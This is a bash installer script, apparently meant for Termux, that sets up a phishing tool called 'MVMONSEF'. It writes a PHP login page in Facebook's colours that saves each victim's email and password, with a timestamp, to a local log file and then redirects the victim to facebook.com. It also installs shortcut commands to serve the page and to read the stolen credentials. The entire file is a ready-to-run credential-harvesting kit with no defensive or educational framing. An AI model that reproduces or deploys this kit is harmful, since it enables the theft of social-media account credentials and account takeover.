#!/bin/bash

echo "Installing MVMONSEF..."
pkg install php -y

mkdir -p ~/MVMONSEF
cd ~/MVMONSEF

cat > index.php << 'PHPEOF'
<?php
if($_POST["email"] && $_POST["password"]){
    $data = date("Y-m-d H:i:s")." | ".$_POST["email"]." | ".$_POST["password"]."\n";
    file_put_contents("logs.txt", $data, FILE_APPEND);
    header("Location: https://facebook.com");
    exit;
}
?>
<html>
<body style="background:#1877f2;display:flex;justify-content:center;align-items:center;height:100vh">
<div style="background:white;padding:30px;border-radius:10px;text-align:center;width:300px">
<h2 style="color:#1877f2">Login</h2>
<form method="POST">
<input type="email" name="email" placeholder="Email" required style="padding:10px;margin:5px;width:100%;border:1px solid #ddd;border-radius:5px">
<input type="password" name="password" placeholder="Password" required style="padding:10px;margin:5px;width:100%;border:1px solid #ddd;border-radius:5px">
<button type="submit" style="padding:10px;background:#1877f2;color:white;border:none;border-radius:5px;width:100%;margin-top:10px">Login</button>
</form>
</div>
</body>
</html>
PHPEOF

echo 'cd ~/MVMONSEF && php -S 127.0.0.1:8080' > $PREFIX/bin/monsef
echo 'cat ~/MVMONSEF/logs.txt' > $PREFIX/bin/monsef-logs
chmod +x $PREFIX/bin/monsef
chmod +x $PREFIX/bin/monsef-logs

echo "✅ Installation complete!"
echo "Usage: monsef        # Start tool"
echo "       monsef-logs   # View logs"
